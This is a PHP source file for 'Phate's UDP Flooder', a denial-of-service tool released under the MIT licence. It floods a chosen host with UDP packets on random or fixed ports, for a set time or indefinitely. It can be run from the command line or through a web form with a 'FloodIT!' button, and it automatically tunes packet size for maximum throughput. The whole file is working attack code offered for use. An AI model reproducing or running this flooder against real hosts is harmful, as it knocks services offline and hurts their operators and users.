<?php
/*
PUF: Phate's UDP Flooder V1.0

More info/latest version: 
https://github.com/udp-flooder/puf

The MIT License (MIT)

Copyright (c) 2013 udp-flooder

Permission is hereby granted, free of charge, to any person obtaining a copy of
this software and associated documentation files (the "Software"), to deal in
the Software without restriction, including without limitation the rights to
use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
the Software, and to permit persons to whom the Software is furnished to do so,
subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

$file = end(explode(DIRECTORY_SEPARATOR, __FILE__)); $cache = true; $cacheData = array();

// Determine web/CLI
if (defined('PHP_SAPI') || function_exists('php_sapi_name')) {
    if (PHP_SAPI == 'cli' || php_sapi_name() == 'cli') {
        echo '========================' . PHP_EOL;
        echo 'Phate\'s UDP Flooder V1.0' . PHP_EOL;
        $cli = true;
        $args = $_SERVER['argv'];
        if ($_SERVER['argc'] == 1 || $args[1] == '-h' || $args[1] == '-help') {
            echo 'Usage:' . PHP_EOL;
            echo $file . ' [host/ip] [time=300] [port=random] [size=optimised/cache]' . PHP_EOL . PHP_EOL;
            echo $file . ' (shows this)' . PHP_EOL;
            echo $file . ' 1.2.3.4 (floods host for 300 seconds on random ports)' . PHP_EOL;
            echo $file . ' 1.2.3.4 60 (floods host for 60 seconds on random ports)';
            echo $file . ' 1.2.3.4 0 80 (floods host on fixed port, indefinitly)';
            echo $file . ' 1.2.3.4 300 80 25000 (floods host for 300 seconds on fixed port with fixed packet-size, disabling optimised speed)' . PHP_EOL;
            echo $file . ' host.io 0 0 35000 (floods host on random port with fixed packet-size, disabling optimised speed, indefinitly)' . PHP_EOL;
            echo $file . ' host.io -nocache (optimised speed without cache)' . PHP_EOL;
            echo $file . ' -showcache (shows optimised speed/from cache)' . PHP_EOL;
            exit(0);
        }
    }
}
if (!isset($cli)) {
    set_time_limit(0);
    $cli = false;
    $args = $_REQUEST;
}

if ($cli) {
    for ($i = 1; $i < count($args); $i++) {
        if (trim($args[$i]) == '-nocache') {
            $cache = false;
            echo '- cache disabled' . PHP_EOL;
        }
        if (trim($args[$i]) == '-showcache') {
            if (file_exists($file . '.dat')) {
                exit(file_get_contents($file . '.dat'));
            }
            exit('No cache available');
        }
    }
}   
else {
    echo '<doctype html><html><head><title>PUF: Phate\'s UDP Flooder V1.0</title><meta charset="UTF-8"></head><body><h1>PUF: Phate\'s UDP Flooder</h1><form method="post">';
    if (isset($args['nocache']) && $args['nocache'] == 'yes') {
        $cache = false;
    }
    else if (isset($args['showcache'])) {
        echo '<strong>Cache</strong><br /><pre>' . $_SESSION['pufpackets'] . PHP_EOL . $_SESSION['pufspeed'] . '</pre><hr /><pre>';
    }
}

if (file_exists($file . '.dat')) {
    $cacheData = explode(PHP_EOL, file_get_contents($file . '.dat'));
    foreach ($cacheData as $index => $value) {
        $tmp = explode(';', $value);
        $cacheData[$index] = $tmp[0];
    }
}
else if (isset($_SESSION['pufsize'])) {
    $cacheData[] = $_SESSION['pufsize'];
}

if (count($args) >= 2) {
    $host = $args[1];
    if (!isset($args[4])) {
        if ($cache && empty($cacheData)) {
            echo '- no cache available' . PHP_EOL;
            echo '- creating one takes a few seconds, hold on' . PHP_EOL;
        }
    }
    $size = isset($args[4]) ? intval($args[4]) : getSize();
    $strt = time();
    $time = (isset($args[2]) ? intval($args[2]) : 300);
    $mxtm = time() + $time;
    $port = isset($args[3]) ? intval($args[3]) : 0;
    $pcks = $last = 0;
    $pckt = str_repeat('P', $size);
    while (true) {
        $time = (time() - $strt);
        if (time() >= $mxtm) {
            echo $pcks . " sent   \t" . round($pcks / $time, 2) . "/s   \t" . @round(((($pcks * $size) / 1024) / 1024) / $time, 2) . "mB/s   " . PHP_EOL;
            break;
        }
        $pcks++;
        $tport = $port;
        if (!$port) {
            $tport = rand(21, 65024);
        }
        $fp = @fsockopen('udp://' . $host, $tport, $ern, $ers, 1);
        if ($fp) {
            fwrite($fp, $pckt);
            fclose($fp);
        }
        if ($last != time()) {
            echo $pcks . " sent   \t" . @round($pcks / $time, 2) . "/s   \t" . @round(((($pcks * $size) / 1024) / 1024) / $time, 2) . "mB/s   \r";
            $last = time();
        }
    }
    if ($cli) {
        exit(PHP_EOL . '========================');
    }
}

if (!$cli) {
    echo '</pre>
    <label for="host">Host</label><br />
    <input type="text" name="host" value="' . (isset($args[1]) ? htmlentities($args[1]) : '') . '" /><br />
    <label for="time">Time</label><br />
    <input type="text" name="time" value="' . (isset($args[2]) ? intval($args[2]) : 300) . '" /><br />
    <label for="port">Port</label><br />
    <input type="text" name="port" value="' . (isset($args[3]) ? intval($args[3]) : '') . '"/><br />
    <label for="size">Size (Optimised/Custom)</label><br />
    <input type="text" name="size" value="' . (isset($args[4]) ? intval($args[4]) : '') . '" /><br />
    <label for="cache">Cache</label><br />
    <input type="checkbox" name="cache" value="yes" ' . ($cache ? 'checked="checked"' : '') . ' /><br />
    <input type="submit" value="FloodIT!" /> &nbsp; <input type="submit" name="showcache" value="Show cache" />
    </form></body></html>';
}

function getSize() {
    global $cli, $cacheData, $file, $host;
    
    if ($cli) {
        if (!empty($cacheData[2])) {
            return $cacheData[2];
        }
    }
    else {
        if (!empty($_SESSION['pufsize'])) {
            return $_SESSION['pufsize'];
        }
    }
    
    $size = 5000;
    $speed = '?';
    $bestsize = 0;
    $bestpackets = 0;
    while ($size <= 65000) {
        $end = time() + 5;
        $packets = 0;
        while (true) {
            if (time() > $end) {
                break;
            }
            $package = str_repeat('X', $size);
            $fp = @fsockopen('udp://' . $host, 80, $ern, $ers, 1);
            if ($fp) {
                @fwrite($fp, $package);
                fclose($fp);
            }
            $packets++;
        }
        
        $toBeat = round( ($bestsize * $bestpackets) / 5 );
        $beatMe = round( ($size * $packets) / 5 );
        if ($beatMe >= $toBeat) {
            $speed = round (($beatMe / 1024) / 1024, 2);
            echo '[Update] New speed: ' . $size . ' bytes, ' . $packets . '/s, ' . $speed . 'mB/s' . PHP_EOL;
            $bestsize = $size;
            $bestpackets = $packets;
        }
        sleep(5);
        $size += 5000;
    }
    
    if ($cli) {
        $fp = @fopen(str_replace('php', 'dat', $file), 'W');
        if (!$fp) {
            echo '[WARNING] Cache file could not be created. Optimised size is ' . $size . ' at ' . $speed . ' mB/s' . PHP_EOL;
        }
        else {
            $fw = fwrite($fp, $size . '; packets per request' . PHP_EOL . $speed . '; mB/s');
            if (!$fw) {
                echo '[WARNING] Could not write to cache file. Optimised size is ' . $size . ' at ' . $speed . ' mB/s' . PHP_EOL;
            }
            fclose($fp);
        }
    }
    else {
        $_SESSION['pufsize'] = $size;
        $_SESSION['pufspeed'] = $speed;
    }
    
    return $size;
}
